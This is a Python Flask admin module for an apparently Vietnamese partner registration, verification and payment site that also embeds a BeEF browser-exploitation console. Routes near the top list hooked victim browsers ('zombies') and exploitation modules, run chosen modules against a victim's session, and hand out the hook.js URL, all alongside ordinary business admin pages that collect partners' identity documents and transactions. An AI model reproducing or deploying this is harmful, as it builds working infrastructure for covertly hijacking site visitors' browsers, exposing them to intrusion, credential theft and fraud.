from flask import Blueprint, render_template, request, redirect, url_for, flash, jsonify, current_app, send_from_directory, abort
from flask_login import login_required, current_user
from datetime import datetime, timedelta
from sqlalchemy import func
import logging

import io
import csv
import os
from flask import make_response

from models import (db, PartnerRegistration, AccountVerification, Transaction, 
                   AdminUser, ActivityLog, VerificationDocument, VerificationTypeEnum, TransactionStatus)
from beef_proxy import BeEFProxy

admin_bp = Blueprint('admin', __name__)
logger = logging.getLogger(__name__)

# Đã chuyển toàn bộ logic đăng nhập sang auth_bp

@admin_bp.route('/beef-dashboard')
@login_required
def beef_dashboard():
    beef = BeEFProxy()
    zombies_data = beef.get_zombies()
    modules_data = beef.get_modules()
    return render_template('admin/beef_dashboard.html', zombies=zombies_data.get('hooked-browsers', []), modules=modules_data.get('modules', []))

@admin_bp.route('/beef')
@login_required
def beef_panel():
    """BeEF Management Panel"""
    return render_template('admin/beef_panel.html')

@admin_bp.route('/beef/execute', methods=['POST'])
@login_required
def execute_beef_module():
    data = request.json
    beef = BeEFProxy()
    result = beef.execute_module(
        data['session_id'], 
        data['module_name'], 
        data['parameters']
    )
    return jsonify(result)

@admin_bp.route('/api/beef/zombies', methods=['GET'])
@login_required
def get_beef_zombies_api():
    beef = BeEFProxy()
    zombies_data = beef.get_zombies()
    return jsonify(zombies_data)

@admin_bp.route('/api/beef/modules', methods=['GET'])
@login_required
def get_beef_modules_api():
    beef = BeEFProxy()
    modules_data = beef.get_modules()
    return jsonify(modules_data)

@admin_bp.route('/api/beef/modules/<string:module_id>', methods=['GET'])
@login_required
def get_beef_module_details_api(module_id):
    beef = BeEFProxy()
    module_details = beef.get_module_details(module_id)
    return jsonify(module_details)

@admin_bp.route('/api/beef/hook-url', methods=['GET'])
@login_required
def get_beef_hook_url():
    beef_host = current_app.config['BEEF_HOST']
    beef_port = current_app.config['BEEF_PORT']
    hook_url = f"http://{beef_host}:{beef_port}/hook.js"
    return jsonify({'hook_url': hook_url})

@admin_bp.route('/')
@admin_bp.route('/dashboard')
@login_required
def dashboard():
    """Admin dashboard with overview statistics"""
    try:
        days = int(request.args.get('days', 7)) # Default to 7 days
        end_date = datetime.utcnow()
        start_date = end_date - timedelta(days=days)

        # Dashboard statistics
        stats = {
            'total_partners': PartnerRegistration.query.count(),
            'pending_registrations': PartnerRegistration.query.filter_by(status='pending').count(),
            'approved_registrations': PartnerRegistration.query.filter_by(status='approved').count(),
            'total_verifications': AccountVerification.query.count(),
            'pending_verifications': AccountVerification.query.filter_by(status='pending').count(),
            'total_transactions': Transaction.query.count(),
            'total_amount': db.session.query(func.sum(Transaction.amount)).scalar() or 0,
            'recent_transaction_value': db.session.query(func.sum(Transaction.amount)).filter(Transaction.created_at >= start_date).scalar() or 0,
            'recent_transaction_count': Transaction.query.filter(Transaction.created_at >= start_date).count()
        }

        # Registration data for chart
        registration_data = db.session.query(
            func.strftime('%Y-%m-%d', PartnerRegistration.created_at).label('date'),
            func.count(PartnerRegistration.id).label('count')
        ).filter(
            PartnerRegistration.created_at >= start_date
        ).group_by(
            func.strftime('%Y-%m-%d', PartnerRegistration.created_at)
        ).order_by(
            func.strftime('%Y-%m-%d', PartnerRegistration.created_at)
        ).all()
        
        # Fill missing dates with 0 registrations
        date_counts = {row.date: row.count for row in registration_data}
        full_registration_data = []
        current_day = start_date
        while current_day <= end_date:
            date_str = current_day.strftime('%Y-%m-%d')
            full_registration_data.append({'date': date_str, 'count': date_counts.get(date_str, 0)})
            current_day += timedelta(days=1)

        # Industry distribution data for chart
        industry_data = db.session.query(
            PartnerRegistration.industry,
            func.count(PartnerRegistration.id).label('count')
        ).group_by(
            PartnerRegistration.industry
        ).all()

        # Recent activity
        recent_registrations = PartnerRegistration.query.order_by(
            PartnerRegistration.created_at.desc()
        ).limit(10).all()

        recent_activities = ActivityLog.query.order_by(
            ActivityLog.created_at.desc()
        ).limit(15).all()

        return render_template('admin/dashboard.html',
                             stats=stats,
                             days=days,
                             registration_data=full_registration_data,
                             industry_data=industry_data,
                             recent_registrations=recent_registrations,
                             recent_activities=recent_activities)

    except Exception as e:
        logger.error(f"Dashboard error: {e}")
        flash('Có lỗi xảy ra khi tải dashboard.', 'error')
        return render_template('admin/dashboard.html', stats={}, days=7, registration_data=[], industry_data=[], recent_registrations=[], recent_activities=[])

@admin_bp.route('/partners')
@login_required
def partners():
    """Partner registrations management"""
    page = request.args.get('page', 1, type=int)
    status_filter = request.args.get('status', 'all')
    search = request.args.get('search', '')

    try:
        query = PartnerRegistration.query

        # Apply filters
        if status_filter != 'all':
            query = query.filter(PartnerRegistration.status == status_filter)

        if search:
            query = query.filter(
                db.or_(
                    PartnerRegistration.business_name.ilike(f'%{search}%'),
                    PartnerRegistration.business_email.ilike(f'%{search}%'),
                    PartnerRegistration.representative_name.ilike(f'%{search}%')
                )
            )

        # Order by latest first and paginate
        registrations = query.order_by(PartnerRegistration.created_at.desc()).paginate(
            page=page, per_page=20, error_out=False
        )

        return render_template('admin/partners.html',
                             registrations=registrations,
                             status_filter=status_filter,
                             search=search)

    except Exception as e:
        logger.error(f"Partners page error: {e}")
        flash('Có lỗi xảy ra khi tải danh sách đối tác.', 'error')
        # Create an empty pagination object to avoid template errors
        from sqlalchemy.orm import Query
        empty_query = Query([]).paginate(page=1, per_page=20, error_out=False)
        return render_template('admin/partners.html', 
                             partners=empty_query,
                             registrations=empty_query.items,
                             status_filter=request.args.get('status', ''),
                             search=request.args.get('search', ''))

@admin_bp.route('/partners/<int:partner_id>')
@login_required
def partner_detail(partner_id):
    """Partner registration detail"""
    try:
        registration = PartnerRegistration.query.get_or_404(partner_id)

        # Get verification requests for this partner
        verifications = AccountVerification.query.filter_by(
            partner_id=partner_id
        ).order_by(AccountVerification.submitted_at.desc()).all()

        # Get activity logs related to this partner
        activities = ActivityLog.query.filter(
            ActivityLog.resource_type == 'PartnerRegistration',
            ActivityLog.resource_id == partner_id
        ).order_by(ActivityLog.created_at.desc()).all()

        return render_template('admin/partner_detail.html',
                             registration=registration,
                             verifications=verifications,
                             activities=activities)

    except Exception as e:
        logger.error(f"Partner detail error: {e}")
        flash('Có lỗi xảy ra khi tải thông tin đối tác.', 'error')
        return redirect(url_for('admin.partners'))

@admin_bp.route('/verifications')
@login_required
def verifications():
    """Account verifications management"""
    page = request.args.get('page', 1, type=int)
    status_filter = request.args.get('status', 'all')
    type_filter = request.args.get('type', 'all')

    try:
        query = AccountVerification.query

        # Apply filters
        if status_filter != 'all':
            query = query.filter(AccountVerification.status == status_filter)

        if type_filter != 'all':
            query = query.filter(AccountVerification.verification_type == VerificationTypeEnum[type_filter.upper()])

        # Order by latest first and paginate
        verification_requests = query.order_by(
            AccountVerification.submitted_at.desc()
        ).paginate(page=page, per_page=20, error_out=False)

        return render_template('admin/verifications.html',
                             verifications=verification_requests,
                             status_filter=status_filter,
                             type_filter=type_filter,
                             verification_types=VerificationTypeEnum)

    except Exception as e:
        logger.error(f"Verifications page error: {e}")
        flash('Có lỗi xảy ra khi tải danh sách xác minh.', 'error')
        return render_template('admin/verifications.html', verifications=None)

@admin_bp.route('/verifications/<int:verification_id>')
@login_required
def verification_detail(verification_id):
    """Verification request detail"""
    try:
        verification = AccountVerification.query.get_or_404(verification_id)

        # Get related partner registration
        partner = PartnerRegistration.query.filter_by(
            id=verification.partner_id
        ).first()

        return render_template('admin/verification_detail.html',
                             verification=verification,
                             partner=partner)

    except Exception as e:
        logger.error(f"Verification detail error: {e}")
        flash('Có lỗi xảy ra khi tải thông tin xác minh.', 'error')
        return redirect(url_for('admin.verifications'))

@admin_bp.route('/verifications/<int:verification_id>/approve', methods=['POST'])
@login_required
def approve_verification(verification_id):
    """Approve verification request"""
    try:
        verification = AccountVerification.query.get_or_404(verification_id)
        data = request.get_json() or {}

        verification.status = 'approved'
        verification.admin_notes = data.get('notes', '')
        verification.processed_by = current_user.id
        verification.processed_at = datetime.utcnow()

        # Log activity
        activity = ActivityLog(
            admin_user_id=current_user.id,
            action='approve_verification',
            resource_type='AccountVerification',
            resource_id=verification.id,
            details=f'Approved verification request #{verification.id} for partner {verification.partner_id}',
            ip_address=request.remote_addr,
            user_agent=request.headers.get('User-Agent')
        )

        db.session.add(activity)
        db.session.commit()

        return jsonify({
            'success': True,
            'message': f'Đã duyệt yêu cầu xác minh #{verification.id}'
        })

    except Exception as e:
        db.session.rollback()
        logger.error(f"Approve verification error: {e}")
        return jsonify({'error': 'Không thể duyệt yêu cầu xác minh'}), 500

@admin_bp.route('/verifications/<int:verification_id>/reject', methods=['POST'])
@login_required
def reject_verification(verification_id):
    """Reject verification request"""
    try:
        verification = AccountVerification.query.get_or_404(verification_id)
        data = request.get_json() or {}

        verification.status = 'rejected'
        verification.admin_notes = data.get('notes', 'Không đáp ứng yêu cầu xác minh')
        verification.processed_by = current_user.id
        verification.processed_at = datetime.utcnow()

        # Log activity
        activity = ActivityLog(
            admin_user_id=current_user.id,
            action='reject_verification',
            resource_type='AccountVerification',
            resource_id=verification.id,
            details=f'Rejected verification request #{verification.id} for partner {verification.partner_id}: {verification.admin_notes}',
            ip_address=request.remote_addr,
            user_agent=request.headers.get('User-Agent')
        )

        db.session.add(activity)
        db.session.commit()

        return jsonify({
            'success': True,
            'message': f'Đã từ chối yêu cầu xác minh #{verification.id}'
        })

    except Exception as e:
        db.session.rollback()
        logger.error(f"Reject verification error: {e}")
        return jsonify({'error': 'Không thể từ chối yêu cầu xác minh'}), 500

@admin_bp.route('/transactions')
@login_required
def transactions():
    """Transaction management"""
    page = request.args.get('page', 1, type=int)
    status_filter = request.args.get('status', '')
    date_from_str = request.args.get('date_from', '')
    date_to_str = request.args.get('date_to', '')

    try:
        query = Transaction.query

        if status_filter:
            query = query.filter(Transaction.status == status_filter)

        if date_from_str:
            date_from = datetime.strptime(date_from_str, '%Y-%m-%d')
            query = query.filter(Transaction.created_at >= date_from)
        else:
            date_from = None

        if date_to_str:
            date_to = datetime.strptime(date_to_str, '%Y-%m-%d') + timedelta(days=1) # Include end date
            query = query.filter(Transaction.created_at < date_to)
        else:
            date_to = None

        # Calculate summary statistics before pagination
        all_filtered_transactions = query.all()
        total_amount = sum(t.amount for t in all_filtered_transactions) if all_filtered_transactions else 0
        completed_transactions_count = sum(1 for t in all_filtered_transactions if t.status.value == 'completed')
        pending_transactions_count = sum(1 for t in all_filtered_transactions if t.status.value == 'pending')
        failed_transactions_count = sum(1 for t in all_filtered_transactions if t.status.value == 'failed')

        transaction_list = query.order_by(Transaction.created_at.desc()).paginate(
            page=page, per_page=20, error_out=False
        )

        return render_template('admin/transactions.html',
                             transactions=transaction_list,
                             status_filter=status_filter,
                             date_from=date_from_str,
                             date_to=date_to_str,
                             total_amount=total_amount,
                             completed_transactions_count=completed_transactions_count,
                             pending_transactions_count=pending_transactions_count,
                             failed_transactions_count=failed_transactions_count,
                             transaction_statuses=TransactionStatus) # Pass the Enum to template

    except Exception as e:
        logger.error(f"Transactions page error: {e}")
        flash('Có lỗi xảy ra khi tải danh sách giao dịch.', 'error')
        return render_template('admin/transactions.html', transactions=None)

@admin_bp.route('/api/transactions/export')
@login_required
def export_transactions():
    """Export transactions to CSV or PDF"""
    format = request.args.get('format', 'csv')
    status_filter = request.args.get('status', '')
    date_from_str = request.args.get('date_from', '')
    date_to_str = request.args.get('date_to', '')

    try:
        query = Transaction.query

        if status_filter:
            query = query.filter(Transaction.status == status_filter)

        if date_from_str:
            date_from = datetime.strptime(date_from_str, '%Y-%m-%d')
            query = query.filter(Transaction.created_at >= date_from)

        if date_to_str:
            date_to = datetime.strptime(date_to_str, '%Y-%m-%d') + timedelta(days=1)
            query = query.filter(Transaction.created_at < date_to)

        transactions_to_export = query.order_by(Transaction.created_at.desc()).all()

        if format == 'csv':
            si = io.StringIO()
            cw = csv.writer(si)
            
            # Write header
            cw.writerow(['Mã giao dịch', 'Partner ID', 'Số tiền', 'Phí', 'Số tiền thực nhận', 'Phương thức', 'Trạng thái', 'Ngày tạo', 'Ngày hoàn thành', 'Mô tả'])
            
            # Write data
            for t in transactions_to_export:
                cw.writerow([
                    t.transaction_id,
                    t.partner_id,
                    str(t.amount),
                    str(t.fee_amount),
                    str(t.net_amount),
                    t.payment_method,
                    t.status.value,
                    t.created_at.strftime('%Y-%m-%d %H:%M:%S'),
                    t.completed_at.strftime('%Y-%m-%d %H:%M:%S') if t.completed_at else '',
                    t.description
                ])
            
            output = make_response(si.getvalue())
            output.headers["Content-Disposition"] = "attachment; filename=transactions.csv"
            output.headers["Content-type"] = "text/csv"
            return output

        elif format == 'pdf':
            # Placeholder for PDF export logic
            flash('Chức năng xuất PDF đang được phát triển.', 'info')
            return redirect(url_for('admin.transactions'))

        else:
            flash('Định dạng xuất không hợp lệ.', 'error')
            return redirect(url_for('admin.transactions'))

    except Exception as e:
        logger.error(f"Error exporting transactions: {e}")
        flash('Có lỗi xảy ra khi xuất dữ liệu giao dịch.', 'error')
        return redirect(url_for('admin.transactions'))

@admin_bp.route('/api/transactions/<string:transaction_id>')
@login_required
def transaction_detail_api(transaction_id):
    """API endpoint to get transaction details for modal"""
    try:
        transaction = Transaction.query.filter_by(transaction_id=transaction_id).first_or_404()
        return render_template('admin/transaction_detail.html', transaction=transaction)
    except Exception as e:
        logger.error(f"Transaction detail API error for {transaction_id}: {e}")
        return jsonify({'error': 'Không thể tải chi tiết giao dịch'}), 500

@admin_bp.route('/users')
@login_required
def users():
    """Admin users management"""
    if current_user.role not in ['admin', 'super_admin']:
        flash('Bạn không có quyền truy cập trang này.', 'error')
        return redirect(url_for('admin.dashboard'))
        flash('Bạn không có quyền truy cập trang này.', 'error')
        return redirect(url_for('admin.dashboard'))

    page = request.args.get('page', 1, type=int)
    try:
        admin_users = AdminUser.query.order_by(AdminUser.created_at.desc()).paginate(
            page=page, per_page=20, error_out=False
        )
        return render_template('admin/users.html', users=admin_users)

    except Exception as e:
        logger.error(f"Users page error: {e}")
        flash('Có lỗi xảy ra khi tải danh sách người dùng.', 'error')
        return render_template('admin/users.html', users=[])

@admin_bp.route('/api/users/<int:user_id>')
@login_required
def get_user_data(user_id):
    """API endpoint to get user data for editing"""
    try:
        user = AdminUser.query.get_or_404(user_id)
        return jsonify({
            'id': user.id,
            'username': user.username,
            'email': user.email,
            'full_name': user.full_name,
            'role': user.role,
            'is_active': user.is_active
        })
    except Exception as e:
        logger.error(f"Error getting user data for {user_id}: {e}")
        return jsonify({'error': 'Không thể tải dữ liệu người dùng'}), 500

@admin_bp.route('/users/create', methods=['POST'])
@login_required
def create_user():
    """Create a new admin user"""
    if current_user.role not in ['super_admin']:
        return jsonify({'error': 'Bạn không có quyền thực hiện hành động này'}), 403

    try:
        username = request.form.get('username')
        email = request.form.get('email')
        full_name = request.form.get('full_name')
        password = request.form.get('password')
        role = request.form.get('role', 'admin')

        if not all([username, email, password]):
            return jsonify({'error': 'Vui lòng điền đầy đủ thông tin bắt buộc'}), 400

        if AdminUser.query.filter_by(username=username).first():
            return jsonify({'error': 'Tên đăng nhập đã tồn tại'}), 400

        if AdminUser.query.filter_by(email=email).first():
            return jsonify({'error': 'Email đã tồn tại'}), 400

        new_user = AdminUser(
            username=username,
            email=email,
            full_name=full_name,
            role=role
        )
        new_user.set_password(password)

        db.session.add(new_user)
        
        # Log activity
        activity = ActivityLog(
            admin_user_id=current_user.id,
            action='create_user',
            resource_type='AdminUser',
            resource_id=new_user.id,
            details=f'Created new admin user: {username}',
            ip_address=request.remote_addr,
            user_agent=request.headers.get('User-Agent')
        )
        db.session.add(activity)
        db.session.commit()

        return jsonify({'success': True, 'message': 'Tài khoản đã được tạo thành công'})

    except Exception as e:
        db.session.rollback()
        logger.error(f"Error creating user: {e}")
        return jsonify({'error': 'Có lỗi xảy ra khi tạo tài khoản'}), 500

@admin_bp.route('/users/<int:user_id>/edit', methods=['POST'])
@login_required
def edit_user(user_id):
    """Edit an existing admin user"""
    if current_user.role not in ['super_admin']:
        return jsonify({'error': 'Bạn không có quyền thực hiện hành động này'}), 403

    try:
        user = AdminUser.query.get_or_404(user_id)
        email = request.form.get('email')
        full_name = request.form.get('full_name')
        password = request.form.get('new_password')
        role = request.form.get('role')

        if email and AdminUser.query.filter(AdminUser.email == email, AdminUser.id != user_id).first():
            return jsonify({'error': 'Email đã tồn tại'}), 400

        user.email = email
        user.full_name = full_name
        user.role = role

        if password:
            user.set_password(password)

        # Log activity
        activity = ActivityLog(
            admin_user_id=current_user.id,
            action='edit_user',
            resource_type='AdminUser',
            resource_id=user.id,
            details=f'Edited admin user: {user.username}',
            ip_address=request.remote_addr,
            user_agent=request.headers.get('User-Agent')
        )
        db.session.add(activity)
        db.session.commit()

        return jsonify({'success': True, 'message': 'Tài khoản đã được cập nhật thành công'})

    except Exception as e:
        db.session.rollback()
        logger.error(f"Error editing user {user_id}: {e}")
        return jsonify({'error': 'Có lỗi xảy ra khi cập nhật tài khoản'}), 500

@admin_bp.route('/users/<int:user_id>/<action>', methods=['POST'])
@login_required
def toggle_user_status(user_id, action):
    """Activate or deactivate an admin user"""
    if current_user.role not in ['super_admin']:
        return jsonify({'error': 'Bạn không có quyền thực hiện hành động này'}), 403

    if user_id == current_user.id:
        return jsonify({'error': 'Bạn không thể tự khóa/kích hoạt tài khoản của mình'}), 400

    try:
        user = AdminUser.query.get_or_404(user_id)

        if action == 'activate':
            user.is_active = True
            log_action = 'activate_user'
            log_details = f'Activated admin user: {user.username}'
            message = 'Tài khoản đã được kích hoạt thành công'
        elif action == 'deactivate':
            user.is_active = False
            log_action = 'deactivate_user'
            log_details = f'Deactivated admin user: {user.username}'
            message = 'Tài khoản đã bị tạm khóa thành công'
        else:
            return jsonify({'error': 'Hành động không hợp lệ'}), 400

        # Log activity
        activity = ActivityLog(
            admin_user_id=current_user.id,
            action=log_action,
            resource_type='AdminUser',
            resource_id=user.id,
            details=log_details,
            ip_address=request.remote_addr,
            user_agent=request.headers.get('User-Agent')
        )
        db.session.add(activity)
        db.session.commit()

        return jsonify({'success': True, 'message': message})

    except Exception as e:
        db.session.rollback()
        logger.error(f"Error toggling user status for {user_id}: {e}")
        return jsonify({'error': 'Có lỗi xảy ra khi cập nhật trạng thái tài khoản'}), 500

@admin_bp.route('/activity-logs')
@login_required
def activity_logs():
    """Activity logs page"""
    page = request.args.get('page', 1, type=int)
    action_filter = request.args.get('action', 'all')

    try:
        query = ActivityLog.query

        if action_filter != 'all':
            query = query.filter(ActivityLog.action == action_filter)

        logs = query.order_by(ActivityLog.created_at.desc()).paginate(
            page=page, per_page=50, error_out=False
        )

        return render_template('admin/activity_logs.html',
                             logs=logs,
                             action_filter=action_filter)

    except Exception as e:
        logger.error(f"Activity logs error: {e}")
        flash('Có lỗi xảy ra khi tải nhật ký hoạt động.', 'error')
        return render_template('admin/activity_logs.html', logs=None)

# Template filters
@admin_bp.app_template_filter('currency')
def currency_filter(amount):
    """Format currency in VND"""
    return f"{amount:,.0f} ₫" if amount else "0 ₫"

@admin_bp.app_template_filter('datetime')
def datetime_filter(dt):
    """Format datetime"""
    return dt.strftime("%d/%m/%Y %H:%M") if dt else ""

@admin_bp.app_template_filter('date')
def date_filter(dt):
    """Format date"""
    return dt.strftime("%d/%m/%Y") if dt else ""

@admin_bp.app_template_filter('status_badge')
def status_badge_filter(status):
    """Return Bootstrap badge class for status"""
    badge_map = {
        'pending': 'badge-warning',
        'approved': 'badge-success',
        'rejected': 'badge-danger',
        'completed': 'badge-success',
        'failed': 'badge-danger',
        'cancelled': 'badge-secondary'
    }
    return badge_map.get(status, 'badge-secondary')

@admin_bp.route('/download-document/<int:document_id>')
@login_required
def download_document(document_id):
    """Download a verification document"""
    try:
        document = VerificationDocument.query.get_or_404(document_id)
        # Assuming documents are stored in a secure location and path is relative to UPLOAD_FOLDER
        file_path = os.path.join(current_app.config['UPLOAD_FOLDER'], document.filename)
        
        # Ensure the file exists and is within the UPLOAD_FOLDER
        if not os.path.exists(file_path) or not file_path.startswith(current_app.config['UPLOAD_FOLDER']):
            abort(404)

        return send_from_directory(current_app.config['UPLOAD_FOLDER'], document.filename, as_attachment=True, download_name=document.original_filename)

    except Exception as e:
        logger.error(f"Error downloading document {document_id}: {e}")
        flash('Không thể tải tài liệu.', 'error')
        return redirect(url_for('admin.verifications'))